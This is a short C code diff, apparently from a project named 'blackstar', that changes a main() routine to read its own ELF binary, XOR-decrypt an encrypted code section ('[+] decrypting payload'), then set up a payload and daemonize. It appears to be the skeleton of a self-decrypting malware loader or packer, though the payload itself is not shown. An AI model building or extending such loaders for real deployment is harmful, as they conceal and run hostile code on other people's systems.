@@ -1,10 +1,11 @@
 
 #include "elf_utils.h"
 #include "setup.h"
+#include "blackstar.h"
 
 int main(int ac, char * const *av)
 {
-    elf_utils_t *utils = NULL;
+    blackstar_t *bstar = NULL;
     settings_t g_settings = {
         .logfd = 0,
         .sockfd = 0,
@@ -15,16 +16,16 @@ int main(int ac, char * const *av)
     parse_settings(ac, av, &g_settings);
     init(&g_settings);
 
-    utils = elf_read(av[0]);
-    if (!utils) {
+    bstar = bl_read(av[0]);
+    if (!bstar) {
         KILL("[!] Failure reading ELF\n");
         exit(1);
-    } else if (is_first_time) {
-        generate_first_time_key(utils);
+    } else if (is_encrypted) {
+        puts("[+] decrypting payload");
+        decrypt_section(bstar, ELF_CODE, ELF_KEY,
+        ELF_BOOL, &xor_crypt);
         return 0;
     }
-
-    elf_decode(utils);
 
     setup_payload(&g_settings);
     daemonize();
